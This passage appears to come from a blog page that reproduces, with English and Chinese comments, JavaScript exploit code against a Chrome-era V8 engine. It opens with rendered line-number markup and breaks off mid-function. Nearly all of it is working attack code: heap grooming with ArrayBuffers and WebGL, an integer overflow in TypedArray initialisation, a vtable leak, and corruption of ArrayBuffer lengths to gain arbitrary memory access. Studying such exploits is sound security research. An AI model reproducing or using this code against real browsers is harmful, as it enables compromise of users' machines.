class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"?"</span>&gt;---------<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> time = <span class="string">'?'</span> + <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">window</span>.location + <span class="string">''</span>).indexOf(time) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.location = time;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="string">'Ready.\nThis is a Slow Exploit.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nooo = [];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        nooo.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//alert = print;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制将ArrayBuffer转换为native wrapper，用于后面修改其长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This WebGL stuff is just to force an ArrayBuffer or ArrayBufferView to</span></span><br><span class="line"><span class="comment">// create a native wrapper, hopefully without allocating anything else (to</span></span><br><span class="line"><span class="comment">// simplify assumptions).</span></span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">gl = canvas.getContext(<span class="string">"webgl"</span>) || canvas.getContext(<span class="string">"experimental-webgl"</span>);</span><br><span class="line"><span class="keyword">if</span>(!gl) &#123;</span><br><span class="line">    alert(<span class="string">'no webgl'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ext = gl.getExtension(<span class="string">'WEBGL_lose_context'</span>);</span><br><span class="line"><span class="keyword">if</span>(!ext) &#123;</span><br><span class="line">    alert(<span class="string">'no lose_context'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">ext.loseContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">force</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    gl.bufferData(<span class="number">0</span>, buffer, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> thingiesToFree = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForce = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForceEarly = [];</span><br><span class="line"><span class="keyword">var</span> viewsToForceEarly = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    buffersToForce.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">4097</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x52</span>);</span><br><span class="line">        force(buf);</span><br><span class="line">        buffersToForceEarly.push(buf);</span><br><span class="line">        <span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf, <span class="number">0</span>, <span class="number">0x51</span>);</span><br><span class="line">        force(view);</span><br><span class="line">        viewsToForceEarly.push(view);</span><br><span class="line">    &#125;</span><br><span class="line">    thingiesToFree.push([]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hexChars = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asHex</span>(<span class="params">num, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(len === <span class="literal">undefined</span>)</span><br><span class="line">        len = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.log(num)/<span class="built_in">Math</span>.log(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        s += hexChars[(num &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xf</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexDump</span>(<span class="params">off, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = off; i &lt; off + len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != off) s += <span class="string">'\n'</span>;</span><br><span class="line">            s += <span class="string">'+'</span> + asHex(i, <span class="number">8</span>) + <span class="string">':'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += <span class="string">' '</span> + asHex(read8(i), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pre</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'pre'</span>);</span><br><span class="line">    el.innerHTML = s;</span><br><span class="line">    <span class="built_in">document</span>.documentElement.appendChild(el);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sniffAroundInHeap</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'+1'</span>);</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="comment">//ary[0x7eadbeef];</span></span><br><span class="line">    <span class="keyword">var</span> haveVtable = <span class="literal">false</span>, haveBuffers = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ary.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!haveVtable &amp;&amp; ary[i] == <span class="number">0x51</span>) &#123;</span><br><span class="line">            <span class="comment">// this is DataView+0x20, from which we get the vtable</span></span><br><span class="line">            vtable = ary[i - <span class="number">0x20</span>/<span class="number">4</span>];</span><br><span class="line">            <span class="comment">//alert('vtable = ' + vtable);</span></span><br><span class="line">            haveVtable = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveBuffers &lt; <span class="number">2</span> &amp;&amp; ary[i] == <span class="number">0x52</span>) &#123;</span><br><span class="line">            <span class="comment">// this is ArrayBuffer+8, from which we create predictable windows</span></span><br><span class="line">            <span class="comment">// onto memory Why does changing this number affect behavior (v8</span></span><br><span class="line">            <span class="comment">// crashes in ShortCircuitConsString in the garbage collector)?</span></span><br><span class="line">            <span class="keyword">if</span>(haveBuffers == <span class="number">0</span>) &#123;</span><br><span class="line">                callbuf = ary[i<span class="number">-1</span>];</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x100</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7fffffff</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x80000000</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7ffffffe</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            haveBuffers++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveVtable &amp;&amp; haveBuffers == <span class="number">2</span>) &#123;</span><br><span class="line">            launderBuffers(buffersToForceEarly, <span class="string">'savedBuffersToForceEarly'</span>, prepareForCalls);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"didn't find the things"</span>);</span><br><span class="line">    crash();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//hexDump(ary, 0, 0x10000);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新wrapper的长度为memory corrupted的长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">launderBuffers</span>(<span class="params">origBuffers, prop, callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Need to get new V8 wrappers that reflect the native object's new</span></span><br><span class="line">    <span class="comment">// m_sizeInBytes</span></span><br><span class="line">    <span class="comment">// alert('launderBuffers - ' + buffersToForce.length);</span></span><br><span class="line">    <span class="comment">// N.B. this doesn't work with MessageChannels for some reason - the</span></span><br><span class="line">    <span class="comment">// ArrayBuffers become null.  My fault or a bug?</span></span><br><span class="line">    <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//alert('onmessage');</span></span><br><span class="line">            <span class="keyword">var</span> buffers = e.data;</span><br><span class="line">            <span class="built_in">window</span>[prop] = buffers;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffers.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> buffer = buffers[i];</span><br><span class="line">                <span class="keyword">if</span>(buffer.byteLength &gt;= <span class="number">0x7ffffffe</span>) &#123;</span><br><span class="line">                    <span class="comment">//alert('buffer ' + i + '.length = ' + buffer.byteLength);</span></span><br><span class="line">                    <span class="keyword">if</span>(callback(buffer))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            alert(<span class="string">'no good buffers found - '</span> + prop);</span><br><span class="line">            crash();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            alert(<span class="string">'lB exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">            crash();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.postMessage(origBuffers, <span class="string">'*'</span>, origBuffers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceWithWTFArrayBuffer</span>(<span class="params">arrays, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nextOff = <span class="number">0x20</span> - <span class="number">8</span>;</span><br><span class="line">    <span class="comment">// next should have CINUSE and PINUSE set</span></span><br><span class="line">    arrays[j][nextOff + <span class="number">4</span>] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="comment">// now free it</span></span><br><span class="line">    arrays[j] = <span class="literal">null</span>;</span><br><span class="line">    thingiesToFree = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> thingiesToMake = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffersToForce.length; i++) &#123;</span><br><span class="line">        force(buffersToForce[i]);</span><br><span class="line">        <span class="comment">// try unnecessarily hard to cause a GC</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">1000</span>; k++) &#123;</span><br><span class="line">            thingiesToMake.push([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// time to keep overwriting starting at the WTF::ArrayBuffer + 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;<span class="comment">//分配给a byteSize字节，并用B填充它。</span></span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Here's the actual v8 vulnerability in this complicated thing.</span></span><br><span class="line">    <span class="comment">// Runtime_TypedArrayInitializeFromArrayLike checks for the lack of</span></span><br><span class="line">    <span class="comment">// multiplicative overflow with 'length * element_size &lt; length'.</span></span><br><span class="line">    <span class="comment">// 0x24924925 is 2^32/7 + 1, the smallest number for which this check</span></span><br><span class="line">    <span class="comment">// passes, yet there was in fact overflow.</span></span><br><span class="line">    <span class="keyword">var</span> bad = (<span class="number">0x24925000</span> - <span class="number">8</span>) / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> hugetempl = &#123;</span><br><span class="line">      <span class="comment">//length: 0x4924924,</span></span><br><span class="line">      length: <span class="number">0x24924925</span>,</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      i: 76696062,</span></span><br><span class="line"><span class="comment">      get 76696062() &#123;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      i: <span class="number">0</span>,</span><br><span class="line">      get <span class="number">0</span>() &#123;</span><br><span class="line">        